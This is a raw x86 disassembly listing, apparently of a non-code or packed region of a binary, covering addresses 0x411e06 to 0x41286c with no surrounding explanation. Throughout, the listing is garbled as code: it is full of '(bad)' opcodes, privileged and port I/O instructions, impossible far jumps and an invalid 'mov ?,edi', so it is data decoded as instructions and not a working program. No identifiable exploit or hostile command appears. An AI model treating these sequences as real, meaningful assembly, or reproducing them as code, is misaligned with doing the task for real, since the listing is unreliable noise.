  411e06:	ins    DWORD PTR es:[edi],dx
  411e07:	push   edi
  411e08:	add    al,BYTE PTR [eax]
  411e0a:	mov    cs,WORD PTR [edi-0x1a]
  411e0d:	jae    0x411e0f
	...
  411e2b:	add    BYTE PTR [esi-0x3e9ba42b],dh
  411e31:	or     BYTE PTR [edi-0x7dc4a08],al
  411e37:	push   cs
  411e38:	sbb    DWORD PTR [ecx],0x5
  411e3b:	(bad)  
  411e3d:	sub    DWORD PTR [esi],eax
  411e3f:	shr    DWORD PTR ds:0xec10d6e,0x8f
  411e46:	imul   eax,DWORD PTR [ecx-0x74fda8f4],0xffffffc8
  411e4d:	xor    al,dl
  411e4f:	dec    edi
  411e50:	ja     0x411eba
  411e52:	in     al,dx
  411e53:	inc    DWORD PTR [ebx]
  411e55:	pop    ebp
  411e56:	cli    
  411e57:	mov    al,dh
  411e59:	mul    DWORD PTR [edx+0x74]
  411e5c:	sbb    eax,0x16d86600
  411e61:	pop    edi
  411e62:	ror    DWORD PTR [ebx],cl
  411e64:	cmc    
  411e65:	jo     0x411ebd
  411e67:	(bad)  
  411e68:	fild   DWORD PTR [ebx-0x7bfdfbb0]
  411e6e:	mov    ?,edi
  411e70:	retf   0x635f
  411e73:	inc    ebx
  411e74:	ds or  esi,esp
  411e77:	add    DWORD PTR [ecx-0x77edd2a1],edi
  411e7d:	adc    al,0x3
  411e80:	or     eax,0xb5f79c03
  411e85:	(bad)
  411e88:	or     eax,0xeca570f
  411e8d:	(bad)  
  411e8f:	mov    edx,0x0
	...
  411eac:	add    BYTE PTR [eax],al
  411eae:	adc    DWORD PTR [ecx+0x8],eax
  411eb1:	or     edx,DWORD PTR [esi]
  411eb3:	inc    edx
  411eb4:	jmp    0xd90655fc
  411eb9:	loopne 0x411ebc
  411ebb:	mov    edi,DWORD PTR [esi]
  411ebd:	adc    BYTE PTR [esi+0x12046b1c],cl
  411ec3:	lea    esi,[ebp+0x6]
  411ec6:	or     eax,0x5ee76a00
  411ecb:	add    BYTE PTR [edx+0x5b],ch
  411ece:	mov    cl,0xe
  411ed0:	fs push es
  411ed2:	or     al,0x0
  411ed4:	jmp    0x6a68e765
  411ed9:	out    0x1e,eax
  411edb:	add    BYTE PTR [eax-0x372170a4],bh
  411ee1:	add    edx,DWORD PTR [ebp+eax*8+0x6bc98b98]
  411ee8:	push   cs
  411ee9:	add    dl,BYTE PTR es:[esi-0x4f3cef19]
  411ef0:	out    0x42,eax
  411ef2:	loop   0x411efb
  411ef4:	add    dl,ah
  411ef6:	push   eax
  411ef7:	sbb    al,BYTE PTR [ebp+0x79]
  411efa:	aad    0xef
  411efc:	add    dh,BYTE PTR [edi-0xabba0ce]
  411f02:	xchg   ecx,eax
  411f03:	ret    
  411f04:	adc    esp,DWORD PTR [eax-0x36]
  411f07:	push   0x3a
  411f09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f0a:	cs (bad) 
  411f0d:	jb     0x411ee1
  411f0f:	repnz cmp ah,BYTE PTR [edi+0x0]
	...
  411f2e:	add    BYTE PTR [eax],al
  411f30:	out    dx,al
  411f31:	push   cs
  411f32:	lea    esi,[esi+0x11]
  411f35:	add    BYTE PTR [eax],al
  411f37:	(bad)  
  411f38:	retf   0x886a
  411f3b:	lods   al,BYTE PTR ds:[esi]
  411f3c:	sbb    al,BYTE PTR ds:[esi-0x2f]
  411f40:	(bad)  
  411f41:	retf   0xac8a
  411f44:	sub    al,BYTE PTR ds:[esi-0x3b]
  411f48:	xchg   ebx,eax
  411f4a:	out    dx,eax
  411f4b:	push   0xffffffd1
  411f4d:	add    BYTE PTR [eax+0x72],dl
  411f50:	dec    edx
  411f51:	push   0xffffff82
  411f53:	sub    DWORD PTR [ebx],edx
  411f55:	mov    al,0xfe
  411f57:	aam    0x6a
  411f59:	hlt    
  411f5a:	aas    
  411f5b:	jmp    0xa9c5d707
  411f60:	cmp    ebp,DWORD PTR [edx]
  411f62:	mov    esp,DWORD PTR [ecx+eax*8]
  411f65:	or     eax,0x95fde8b6
  411f6a:	push   eax
  411f6b:	call   0xf2485e3f
  411f70:	enter  0xc001,0xf2
  411f74:	push   ebx
  411f75:	push   cs
  411f76:	jge    0x411f54
  411f78:	xor    DWORD PTR [ebx+ecx*1-0x7df596],0x1ff93ed
  411f83:	jmp    0x95a5a296
  411f88:	push   cs
  411f89:	sbb    ecx,DWORD PTR [esi+0x0]
  411f8c:	fdivr  QWORD PTR [eax]
  411f8e:	mov    dl,0x8b
  411f90:	sub    eax,edx
  411f92:	std    
  411f93:	inc    ebp
	...
  411fb0:	add    BYTE PTR [eax],al
  411fb2:	fmul   DWORD PTR [edx+0x466ff043]
  411fb8:	adc    bh,BYTE PTR [ebx]
  411fba:	mov    edx,0x5f577d21
  411fbf:	inc    esi
  411fc0:	jmp    0x1045:0x89032483
  411fc7:	mov    WORD PTR [ebx-0x10],es
  411fca:	mov    bh,0x47
  411fcc:	and    cl,BYTE PTR [ecx-0x3f7e4e97]
  411fd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fd3:	xchg   ecx,eax
  411fd4:	std    
  411fd5:	jne    0x411fc7
  411fd7:	fist   WORD PTR [ebx]
  411fd9:	fs stos BYTE PTR es:[edi],al
  411fdb:	inc    ecx
  411fdc:	(bad)  
  411fdd:	pop    eax
  411fde:	int    0x86
  411fe0:	mov    esi,0x4b8cb675
  411fe5:	lock mov bl,0x77
  411fe8:	dec    DWORD PTR [esi]
  411fea:	dec    edx
  411feb:	dec    edx
  411fec:	inc    eax
  411fee:	adc    al,0x9
  411ff0:	or     eax,ecx
  411ff2:	sar    DWORD PTR [bx+di],0x45
  411ff6:	push   esp
  411ff7:	or     ecx,DWORD PTR ds:[ebx+0x3c82f022]
  411ffe:	cmc    
  411fff:	add    ecx,DWORD PTR [edi]
  412001:	(bad)  
  412002:	jecxz  0x412006
  412004:	add    BYTE PTR [eax],al
  412006:	out    0x66,eax
  412008:	repnz add BYTE PTR [ebx+0x47],dl
  41200c:	adc    cl,BYTE PTR [ebx+0x463957e9]
  412012:	add    al,0x60
  412014:	mov    al,0xf
	...
  412032:	add    BYTE PTR [eax],al
  412034:	mov    edx,0xca0eff44
  412039:	dec    esp
  41203a:	add    cl,al
  41203c:	xchg   esp,eax
  41203d:	or     al,0xb
  41203f:	ror    DWORD PTR ds:0x90825a6a,0x72
  412046:	add    esi,DWORD PTR [ebp+0x14]
  412049:	out    0x1e,eax
  41204b:	push   esp
  41204c:	adc    ah,ah
  41204e:	mov    ecx,0x81670d02
  412053:	(bad)  
  412054:	push   cs
  412055:	jmp    0x5487:0x566efbe0
  41205c:	add    DWORD PTR [edi+0x2],esp
  41205f:	mov    edx,DWORD PTR [eax+0xb]
  412062:	les    ecx,FWORD PTR [edi+0x67]
  412065:	imul   ebx,DWORD PTR [ebp+0x74],0xfe36d229
  41206c:	cmp    BYTE PTR [edi-0x4c],bl
  41206f:	inc    BYTE PTR [eax+0x37]
  412072:	mov    edx,ecx
  412074:	mov    dl,0x93
  412076:	push   cs
  412077:	jmp    DWORD PTR [eax]
  412079:	dec    edi
  41207a:	push   0xfffffff4
  41207c:	mov    eax,ds:0x95e85efd
  412081:	dec    esp
  412082:	add    al,BYTE PTR [eax]
  412084:	xchg   ah,dl
  412086:	ja     0x412087
  412088:	mov    ah,BYTE PTR [esi-0x79]
  41208b:	rcl    DWORD PTR [edx],1
  41208d:	jecxz  0x4120b3
  41208f:	(bad)  
  412090:	jp     0x4120e7
  412092:	or     eax,0xd62cab6
  412097:	mov    dh,0x0
	...
  4120b5:	add    dl,bl
  4120b7:	imul   eax,DWORD PTR [ebx-0x21],0x15
  4120bb:	push   edx
  4120bc:	inc    ebx
  4120bd:	mov    al,dl
  4120bf:	cs pop ds
  4120c1:	call   DWORD PTR [edx+0x66]
  4120c4:	add    cl,BYTE PTR [edi]
  4120c6:	xchg   ecx,eax
  4120c7:	cmp    eax,0x20d0003
  4120cc:	ret    0xa03
  4120cf:	jmp    0x4120dd
  4120d1:	add    DWORD PTR ds:0x21648167,ecx
  4120d7:	(bad)  
  4120d8:	call   0x590c25f
  4120dd:	seto   bh
  4120e0:	xchg   ebp,eax
  4120e1:	pop    esi
  4120e2:	adc    ecx,DWORD PTR [eax-0x1a71d3da]
  4120e8:	fadd   QWORD PTR [ebx]
  4120ea:	mov    ds,edx
  4120ec:	enter  0x8403,0xc5
  4120f0:	test   ch,bl
  4120f2:	sub    al,0xb
  4120f4:	aaa    
  4120f5:	or     ebx,DWORD PTR [edx]
  4120f7:	xchg   edx,eax
  4120f8:	mov    eax,0xf061cc04
  4120fd:	or     al,bh
  4120ff:	pop    ss
  412100:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412101:	pop    ebx
  412102:	pop    esi
  412103:	icebp  
  412104:	jmp    0xab9c0fce
  412109:	not    DWORD PTR [edi+0x518cd4cd]
  41210f:	ins    BYTE PTR es:[edi],dx
  412110:	icebp  
  412111:	int    0x12
  412113:	fmul   QWORD PTR [esi]
  412115:	mov    dl,BYTE PTR [ecx-0xc]
  412118:	loope  0x4120df
	...
  412136:	add    BYTE PTR [eax],al
  412138:	add    cl,BYTE PTR [ebx]
  41213a:	ins    BYTE PTR es:[edi],dx
  41213b:	adc    DWORD PTR [edx+0x498a155b],ebx
  412141:	ins    BYTE PTR es:[edi],dx
  412142:	pop    edi
  412143:	enter  0x177a,0xaf
  412147:	sub    edi,ebx
  412149:	ret    0xc871
  41214c:	push   0x27
  41214e:	scas   eax,DWORD PTR es:[edi]
  41214f:	daa    
  412150:	test   ch,al
  412152:	clc    
  412153:	sub    DWORD PTR [edx-0x3676c702],0xc44696b
  41215d:	mov    al,0xd5
  41215f:	imul   esi
  412161:	icebp  
  412162:	sub    BYTE PTR [esp+eiz*8],al
  412165:	mov    eax,0x22b9446b
  41216a:	jb     0x41213b
  41216c:	sub    cl,BYTE PTR [ebx]
  41216e:	add    BYTE PTR [edi+0x3e],bh
  412171:	or     dh,BYTE PTR [esi-0x1ebef1d8]
  412177:	icebp  
  412178:	adc    eax,0x95778a3e
  41217d:	pop    edx
  41217e:	(bad)  
  41217f:	jmp    0x9644df69
  412184:	dec    ecx
  412185:	idiv   BYTE PTR [edi-0xc3c69d7]
  41218b:	hlt    
  41218c:	ficom  DWORD PTR ds:0x97d9c14e
  412192:	mov    ah,BYTE PTR [ebx*2-0x6802bba6]
  412199:	ret    
  41219a:	out    dx,eax
  41219b:	jb     0x41219d
	...
  4121b9:	add    dl,dl
  4121bb:	out    dx,al
  4121bc:	cmp    ch,BYTE PTR [edi+0x228d0b2e]
  4121c2:	imul   ebx,DWORD PTR [edx-0x2],0x72
  4121c6:	retf   0x8266
  4121c9:	sub    DWORD PTR [edi],ecx
  4121cb:	mov    DWORD PTR [ebp+eax*2-0x7c],eax
  4121cf:	ret    
  4121d0:	out    dx,eax
  4121d1:	jmp    0x7e3e:0xac891ed0
  4121d8:	mov    edi,0x74595eeb
  4121dd:	add    eax,0xf763f430
  4121e2:	dec    esi
  4121e3:	pop    edx
  4121e4:	push   edi
  4121e5:	mov    al,ds:0x640e9a8b
  4121ea:	scas   eax,DWORD PTR es:[edi]
  4121eb:	pop    esp
  4121ec:	(bad)  
  4121ed:	test   BYTE PTR [ebp-0x7f211035],0xbf
  4121f4:	add    dh,dh
  4121f6:	js     0x4121ff
  4121f8:	ror    eax,0x6
  4121fb:	pop    es
  4121fc:	shl    DWORD PTR [edx-0x80],0x6e
  412200:	(bad)  
  412201:	call   0x824914
  412206:	xor    BYTE PTR [ebx+0x3e641bd6],dh
  41220c:	xchg   DWORD PTR [ebp+0x70],eax
  41220f:	xor    DWORD PTR ds:0x8957f1ff,edx
  412215:	inc    ebp
  412216:	and    bh,dh
  412218:	inc    ebp
  412219:	and    al,bh
  41221b:	jo     0x412204
  41221d:	jo     0x41221f
	...
  41223b:	add    BYTE PTR [edx-0x45],bh
  41223e:	std    
  41223f:	(bad)  
  412240:	xor    DWORD PTR [eax-0x20b0001],edi
  412246:	imul   eax,DWORD PTR [ebx],0xfe6ce52c
  41224c:	jnp    0x41220a
  41224e:	or     eax,0xefd33b6
  412253:	mov    dh,0x9b
  412255:	inc    eax
  412257:	loopne 0x412235
  412259:	or     cl,al
  41225b:	(bad)  
  41225c:	sar    ch,1
  41225e:	mov    BYTE PTR [ebp+0x64],dl
  412261:	xchg   BYTE PTR [esp+eax*4+0x3afffdb4],al
  412268:	mov    ds:0xe30c7a51,al
  41226d:	inc    edx
  41226e:	add    DWORD PTR ss:[ebp+edi*8-0x1c41701],esi
  412276:	(bad)  
  412277:	call   FWORD PTR [edi]
  412279:	dec    ebx
  41227a:	or     al,cl
  41227c:	push   es
  41227d:	dec    DWORD PTR [eax+0x54888055]
  412283:	adc    BYTE PTR [edi+0xd],bl
  412286:	mov    dl,BYTE PTR [edx*8-0x12ebbc79]
  41228d:	push   eax
  41228e:	push   es
  41228f:	mov    eax,DWORD PTR [edx-0x3474f7]
  412295:	inc    ebp
  412296:	mov    WORD PTR [eax],bp
  412299:	push   esp
  41229a:	add    cl,BYTE PTR [ebx+0x38542c0d]
	...
  4122bc:	add    BYTE PTR [eax],al
  4122be:	rcl    BYTE PTR [esi+0x9],1
  4122c1:	(bad)  
  4122c2:	lea    ebp,[eax+0x2]
  4122c5:	add    BYTE PTR [esi-0x3776fa59],cl
  4122cb:	imul   esi,DWORD PTR ss:[esp+ecx*1+0x67],0x2
  4122d1:	mov    esp,DWORD PTR [ebx-0x25]
  4122d4:	add    eax,DWORD PTR [eax]
  4122d6:	or     eax,0x143a4b36
  4122db:	bound  edi,QWORD PTR [esi-0x1a]
  4122de:	sub    BYTE PTR [edi+0x2],ah
  4122e1:	cmp    DWORD PTR [edx+0x6b],edx
  4122e4:	or     DWORD PTR [ebp+0x23bdb],eax
  4122ea:	xchg   BYTE PTR [ecx-0x75],ah
  4122ed:	lea    eax,[ecx-0x69fffd9a]
  4122f3:	test   eax,0x64edc0f2
  4122f8:	mov    dl,0xfe
  4122fa:	pop    edx
  4122fb:	arpl   WORD PTR [ecx+0x75],bx
  4122fe:	sbb    edx,ecx
  412300:	lock pop edi
  412302:	sbb    esp,DWORD PTR [edi+0x33528b02]
  412308:	lea    edi,[esi+0x5]
  41230b:	loopne 0x4122cd
  41230d:	setbe  BYTE PTR [ebx+0x52c9826a]
  412314:	mov    eax,DWORD PTR [ebp+esi*8-0x11]
  412318:	adc    al,0xfb
  41231a:	xchg   edx,eax
  41231b:	icebp  
  41231c:	or     dh,BYTE PTR [esi+0x448b67d2]
	...
  41233e:	add    BYTE PTR [eax],al
  412340:	and    eax,0x640142e6
  412345:	inc    esp
  412346:	pop    ebp
  412347:	(bad)  
  412348:	jb     0x412327
  41234a:	shl    BYTE PTR [ebx],0xcd
  41234d:	jbe    0x41233b
  41234f:	push   esp
  412351:	(bad)  
  412352:	call   0x6c3904b1
  412357:	mov    dl,0xf
  412359:	mov    dl,0xd5
  41235b:	rcr    BYTE PTR [edx],1
  41235d:	test   DWORD PTR [ecx-0x39f446a6],esp
  412363:	rcl    BYTE PTR [edx],1
  412365:	push   0x58335da9
  41236a:	imul   ebx,DWORD PTR [ebx+0xd],0x418fcd4
  412371:	pop    esp
  412372:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412373:	pop    edx
  412374:	sahf   
  412375:	and    ah,BYTE PTR [ebx+eax*2-0x62]
  412379:	add    al,0xd4
  41237b:	stc    
  41237c:	push   es
  41237d:	pop    eax
  41237e:	lea    ecx,[edx]
  412380:	mov    BYTE PTR [eax+0x70d03cc],dl
  412386:	aaa    
  412387:	ret    0x70d
  41238a:	aas    
  41238b:	retf   0x410c
  41238e:	mov    BYTE PTR [ebx],cl
  412390:	push   ss
  412391:	inc    ecx
  412392:	jmp    0xb5587df2
  412397:	iret   
  412398:	popf   
  412399:	imul   ebp,esi,0xffffff8e
  41239c:	push   eax
  41239d:	rcr    BYTE PTR [edi-0x40],1
  4123a0:	or     al,BYTE PTR [eax+0xb105]
	...
  4123c2:	or     edi,DWORD PTR [ebx+esi*1-0x9]
  4123c6:	mov    dl,0x57
  4123c8:	ror    BYTE PTR ds:[edx],0x1
  4123cc:	fiadd  WORD PTR [eax+0x3e8f521]
  4123d2:	or     cl,BYTE PTR [esi-0x71fdfb5b]
  4123d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123d9:	add    eax,0xee0604c
  4123de:	dec    esp
  4123df:	add    eax,DWORD PTR [ecx]
  4123e1:	cmp    DWORD PTR [ebx],0xffffffac
  4123e4:	je     0x41244d
  4123e6:	xchg   DWORD PTR [esi-0x1],edi
  4123e9:	push   0x6a00000e
  4123ee:	iret   
  4123ef:	add    DWORD PTR [ecx-0x6d979ed4],ecx
  4123f5:	jecxz  0x4123ab
  4123f7:	push   ebp
  4123f8:	mov    ch,BYTE PTR [ebp*8+0x9434fbf]
  4123ff:	jmp    0x168c:0xef4ac5ff
  412406:	or     BYTE PTR [esi-0x75dec302],ch
  41240c:	retf   0x52ae
  41240f:	or     edi,edi
  412411:	sbb    al,0x9
  412413:	push   0x55b4a333
  412418:	adc    BYTE PTR [ecx+0x6c84070e],0x5
  41241f:	push   edi
  412420:	inc    ah
  412422:	neg    DWORD PTR [edx-0x2]
  412425:	jle    0x412427
	...
  412443:	add    BYTE PTR [esp+edi*2],al
  412446:	xchg   ecx,eax
  412447:	aad    0xe
  412449:	add    BYTE PTR ds:0xfe563acd,bh
  41244f:	fld    QWORD PTR [ecx]
  412451:	adc    eax,0x56345d1b
  412456:	jae    0x41245d
  412458:	and    bh,dl
  41245a:	sti    
  41245b:	dec    esi
  41245c:	shl    DWORD PTR fs:[esp+ebp*2],cl
  412460:	push   ecx
  412461:	ror    DWORD PTR [edx],cl
  412463:	cld    
  412464:	mov    ah,0x5a
  412466:	(bad)  
  412467:	ss adc al,0x7d
  41246a:	add    eax,DWORD PTR ds:0x5f0f0009
  412470:	int3   
  412471:	dec    DWORD PTR [esi]
  412473:	push   edi
  412474:	les    eax,FWORD PTR [eax]
  412476:	ror    DWORD PTR [ecx],0x19
  412479:	or     eax,ecx
  41247b:	jmp    0x4698:0x3ed6e6
  412482:	xchg   edx,eax
  412483:	jmp    0x4124dd
  412485:	pop    es
  412486:	mov    dh,0x47
  412488:	jne    0x412491
  41248a:	mov    dh,0x4f
  41248c:	jbe    0x41244f
  41248e:	fimul  WORD PTR [eax]
  412490:	pop    edi
  412491:	rol    DWORD PTR [ecx],0xf8
  412494:	in     al,0xf7
  412496:	push   ebx
  412497:	je     0x4124e9
  412499:	mov    al,0x43
  41249b:	and    BYTE PTR ds:0x30cc8507,dh
  4124a1:	add    al,BYTE PTR [eax]
  4124a3:	sub    DWORD PTR [ebx-0x5],0xffffffe8
  4124a7:	inc    DWORD PTR [eax]
	...
  4124c5:	add    BYTE PTR [ebp-0x49],bl
  4124c8:	std    
  4124c9:	setp   BYTE PTR [edi]
  4124cc:	dec    DWORD PTR [esi]
  4124ce:	mov    edx,0x84c10047
  4124d3:	or     cl,BYTE PTR [ebx]
  4124d5:	ror    edi,0x19
  4124d8:	cmp    bl,BYTE PTR [esi+0xc]
  4124db:	pop    es
  4124dc:	sbb    BYTE PTR [edx],0xf0
  4124df:	add    DWORD PTR [eax],eax
  4124e1:	cmp    edx,DWORD PTR [edx]
  4124e3:	xor    al,0x71
  4124e5:	fld    TBYTE PTR [ebp-0x69]
  4124e8:	jbe    0x4124d5
  4124ea:	jp     0x412568
  4124ec:	cmp    esi,DWORD PTR [eax]
  4124ee:	dec    ecx
  4124ef:	cmp    al,0xfe
  4124f1:	jmp    ebx
  4124f3:	aad    0x98
  4124f5:	add    BYTE PTR [ecx+eax*1+0x26bb60f],dh
  4124fc:	mov    ecx,DWORD PTR [esi-0x20]
  4124ff:	mov    al,BYTE PTR [ebx-0x2480c94]
  412505:	mov    edi,DWORD PTR [edx-0x3]
  412508:	mov    BYTE PTR [ebp-0x2479c],al
  41250e:	pop    ds
  41250f:	aas    
  412510:	sub    bx,sp
  412513:	mov    DWORD PTR [ebx+0x57ee0d78],ecx
  412519:	(bad)  
  41251a:	xchg   esi,eax
  41251b:	je     0x412527
  41251d:	sub    eax,DWORD PTR [ebp-0x30]
  412520:	jge    0x412595
  412522:	jb     0x41257a
  412524:	push   esi
  412525:	mov    BYTE PTR [eax+0xfe57cb],bl
	...
  412547:	add    BYTE PTR [edx-0x1e],ah
  41254a:	dec    ebx
  41254b:	sub    al,BYTE PTR [ebp+0x4e]
  41254e:	mov    WORD PTR [esi+0xf],es
  412551:	test   al,0x63
  412553:	pop    es
  412554:	xchg   esp,eax
  412555:	sbb    al,0x84
  412557:	push   cs
  412558:	jnp    0x412550
  41255a:	add    cl,BYTE PTR [ebx]
  41255c:	dec    esp
  41255d:	dec    esi
  41255e:	mov    WORD PTR [esi+0x8],cs
  412561:	rol    al,1
  412563:	(bad)  
  412564:	sbb    dl,ch
  412566:	mov    esi,0xb474c03
  41256b:	or     ecx,DWORD PTR [eax+edx*8-0x40]
  41256f:	xchg   ebx,eax
  412570:	xchg   BYTE PTR [esp+esi*8],bl
  412573:	cwde   
  412574:	ss test eax,0x1b94f734
  41257a:	or     BYTE PTR [edx+0x3e293],0xd
  412581:	rol    al,1
  412583:	xchg   DWORD PTR [esi-0x1d00841c],edx
  412589:	xchg   WORD PTR [ebp+eiz*2-0x3501a922],cx
  412591:	fucomi st,st(3)
  412593:	dec    dl
  412595:	lods   eax,DWORD PTR ds:[esi]
  412596:	add    al,0x0
  412598:	or     eax,0x89448b67
  41259d:	mov    ebp,0xa9a82ff0
  4125a2:	add    al,BYTE PTR [ebp-0x5a7aa233]
  4125a8:	or     DWORD PTR [edi+0x2],esp
  4125ab:	sldt   WORD PTR [eax]
	...
  4125ca:	test   edi,edi
  4125cc:	and    eax,0x6a000d22
  4125d1:	aas    
  4125d2:	adc    BYTE PTR [edi-0x3a],ah
  4125d5:	pop    esp
  4125d6:	adc    DWORD PTR [edi+ebx*2-0x27],0x1e
  4125db:	xchg   DWORD PTR [ebx-0x3b4578ad],esp
  4125e1:	ret    
  4125e2:	fucompp 
  4125e4:	call   0x5c34ff3f
  4125e9:	scas   eax,DWORD PTR es:[edi]
  4125ea:	andnps xmm3,XMMWORD PTR [ebx-0x4]
  4125ee:	xchg   DWORD PTR [eax+0x36],ecx
  4125f1:	push   edi
  4125f2:	shr    edi,0xd5
  4125f5:	rcl    BYTE PTR [esi],1
  4125f7:	push   ebp
  4125f8:	push   ebx
  4125f9:	or     al,0x25
  4125fb:	inc    edi
  4125fc:	rcl    BYTE PTR [esi+0x33],0x80
  412600:	rol    BYTE PTR [ecx+eiz*4],0x1a
  412604:	ins    BYTE PTR es:[edi],dx
  412605:	inc    ebx
  412606:	sahf   
  412607:	or     ah,ch
  412609:	cmc    
  41260a:	push   ss
  41260b:	push   esp
  41260c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41260d:	push   es
  41260e:	mov    BYTE PTR [ebx+0x30d03ca],dl
  412614:	pop    edi
  412615:	mov    esi,0xc657030d
  41261a:	or     al,0x41
  41261c:	mov    BYTE PTR [ebx],cl
  41261e:	push   es
  41261f:	inc    ecx
  412620:	jmp    0x1d549080
  412625:	rcr    BYTE PTR [ebx+0x508ae667],1
  41262b:	shr    BYTE PTR [edi-0x40],1
	...
  41264a:	add    BYTE PTR [eax],al
  41264c:	or     al,BYTE PTR [esi-0x3397e81b]
  412652:	loopne 0x41266b
  412654:	pop    ecx
  412655:	add    esp,DWORD PTR [eax+eax*1+0x16]
  412659:	add    cl,ch
  41265b:	push   es
  41265c:	jnp    0x412619
  41265e:	out    0x6,eax
  412660:	arpl   bx,ax
  412662:	(bad)  
  412663:	jmp    0xfe51:0xe2073349
  41266a:	imul   DWORD PTR [ecx-0x5]
  41266d:	stos   DWORD PTR es:[edi],eax
  41266e:	jae    0x41267d
  412670:	mov    ss,WORD PTR [edx]
  412672:	push   ebp
  412673:	bound  eax,QWORD PTR [eax]
  412675:	sar    edi,cl
  412677:	call   0x7d9ead8a
  41267c:	cmp    DWORD PTR [edi+ecx*1-0x2881512],0x5d15b8f6
  412687:	stc    
  412688:	adc    BYTE PTR [edi+ecx*4-0x19],bh
  41268c:	mov    eax,0xc268c51
  412691:	xor    BYTE PTR [edi],0xf0
  412694:	xchg   edi,eax
  412695:	mov    esp,0x8710541f
  41269a:	dec    esp
  41269b:	loope  0x4126a6
  41269d:	mov    al,BYTE PTR [esi-0x1b]
  4126a0:	lea    esp,[eax-0x9]
  4126a3:	loop   0x412674
  4126a5:	xchg   DWORD PTR [ecx+edx*8-0x7b],eax
  4126a9:	mov    esp,0x12892923
  4126ae:	push   edi
  4126af:	jb     0x4126b1
	...
  4126cd:	add    BYTE PTR [ebx+eax*8+0xe],dl
  4126d1:	ins    BYTE PTR es:[edi],dx
  4126d2:	add    eax,0x85e8ffea
  4126d7:	stos   DWORD PTR es:[edi],eax
  4126d8:	pop    ds
  4126d9:	adc    ecx,DWORD PTR [ecx]
  4126db:	push   ebx
  4126dc:	je     0x4126bb
  4126de:	inc    ecx
  4126df:	int3   
  4126e0:	pop    ss
  4126e1:	pop    ds
  4126e2:	cmp    ah,cl
  4126e4:	movd   mm1,edx
  4126e7:	push   es
  4126e8:	(bad)  
  4126e9:	fadd   QWORD PTR [esi]
  4126eb:	push   0x52606113
  4126f0:	test   BYTE PTR [ecx],ch
  4126f2:	or     BYTE PTR [ebp+0x13],bh
  4126f5:	or     edx,DWORD PTR [ecx]
  4126f7:	add    BYTE PTR [ebx-0x189d3700],cl
  4126fd:	inc    esp
  4126fe:	ret    
  4126ff:	(bad)  
  412700:	dec    DWORD PTR [esi]
  412702:	and    dl,BYTE PTR [ebp+0x3d220eff]
  412708:	add    cl,al
  41270a:	add    al,0x4
  41270c:	or     eax,ecx
  41270e:	ja     0x4126c6
  412710:	jle    0x412751
  412712:	rol    BYTE PTR [edx-0x16],0xe9
  412716:	dec    esi
  412717:	mov    dh,0xfd
  412719:	(bad)  
  41271a:	call   DWORD PTR [edx-0x714bb8de]
  412720:	push   0x1a415b00
  412725:	mov    eax,DWORD PTR [ebx]
  412727:	lods   eax,DWORD PTR ds:[esi]
  412728:	jae    0x412742
  41272a:	ffreep st(7)
  41272c:	push   esp
  41272d:	jmp    ecx
  41272f:	dec    ebx
  412730:	std    
  412731:	jne    0x412733
	...
  41274f:	add    BYTE PTR [eax],ch
  412751:	stos   DWORD PTR es:[edi],eax
  412752:	jae    0x41275c
  412754:	dec    esp
  412755:	enter  0xfff5,0x4b
  412759:	sar    DWORD PTR [esi+0x1fc8b10f],1
  41275f:	add    BYTE PTR [ebx+edi*8],dh
  412762:	mov    ch,0x47
  412764:	and    eax,0x264fb5fb
  412769:	mov    ebp,0xbeff08de
  41276e:	add    eax,edi
  412770:	je     0x41275e
  412772:	push   ebx
  412773:	je     0x4127ed
  412775:	out    0xdf,al
  412777:	std    
  412778:	mov    ebp,DWORD PTR [ebp+eax*2-0x4a034c75]
  41277f:	dec    eax
  412780:	cmc    
  412781:	cld    
  412782:	mov    ch,0x50
  412784:	out    0xbe,al
  412786:	fisttp WORD PTR [eax]
  412788:	ffreep st(7)
  41278a:	add    ecx,eax
  41278c:	xor    al,0xf5
  41278e:	push   ebx
  41278f:	je     0x41279e
  412791:	mov    ebx,0xa7f14c87
  412796:	mov    cl,0x69
  412798:	or     eax,0x981bcdba
  41279d:	ja     0x41279e
  41279f:	(bad)  
  4127a0:	sbb    BYTE PTR [edi],ch
  4127a2:	xchg   edx,ecx
  4127a4:	inc    ebx
  4127a5:	and    cl,dh
  4127a7:	setb   BYTE PTR [esi+eax*1-0x1]
  4127ac:	add    BYTE PTR [edi+0x6a],cl
  4127af:	jo     0x41282b
  4127b1:	jmp    0x0:0x8453
	...
  4127d0:	add    BYTE PTR [eax],al
  4127d2:	dec    ebp
  4127d3:	xor    bh,BYTE PTR [ebp+0x70]
  4127d6:	sub    al,0x67
  4127d8:	add    ch,cl
  4127da:	scas   al,BYTE PTR es:[edi]
  4127db:	dec    edx
  4127dc:	push   edx
  4127dd:	dec    dl
  4127df:	pop    ecx
  4127e0:	mov    WORD PTR [esi+0xc],es
  4127e3:	xor    cl,BYTE PTR [esi+ecx*2+0x763a80f]
  4127ea:	push   ss
  4127eb:	test   al,0x6
  4127ed:	clc    
  4127ee:	(bad)  
  4127ef:	jmp    0xfc85:0x402973b7
  4127f6:	xor    bh,BYTE PTR [edx]
  4127f8:	add    dh,BYTE PTR [esi-0x49fe9826]
  4127fe:	retf   0x4364
  412801:	loopne 0x412808
  412803:	pop    esi
  412804:	cmp    cl,BYTE PTR [edx+0x7f432e4a]
  41280a:	inc    ebp
  41280b:	or     BYTE PTR [ebp+0x44],bh
  41280e:	sbb    ebp,esi
  412810:	repz mov cl,BYTE PTR [eax+0x63]
  412814:	jge    0x412866
  412816:	or     esi,ecx
  412818:	cld    
  412819:	mov    BYTE PTR [eax-0x29],al
  41281c:	jl     0x41286a
  41281e:	add    DWORD PTR [esi+0x7],edi
  412821:	xor    DWORD PTR [eax-0x29],0x3
  412825:	mov    al,BYTE PTR ds:0x624d6900
  41282b:	add    DWORD PTR [ebp+0x3c],esp
  41282e:	daa    
  41282f:	add    cl,ch
  412831:	xor    DWORD PTR [ebp+0x87ddb6],0x0
	...
  412854:	jae    0x41284a
  412856:	call   0xa297b55e
  41285b:	add    cl,BYTE PTR [ecx+0xd03d189]
  412861:	sub    BYTE PTR [edi],0xaf
  412864:	add    edi,DWORD PTR [ebx+edx*2-0x11]
  412868:	mov    dl,BYTE PTR [eax+0x68]
  41286b:	dec    ebp
  41286c:	loope  0x41286e
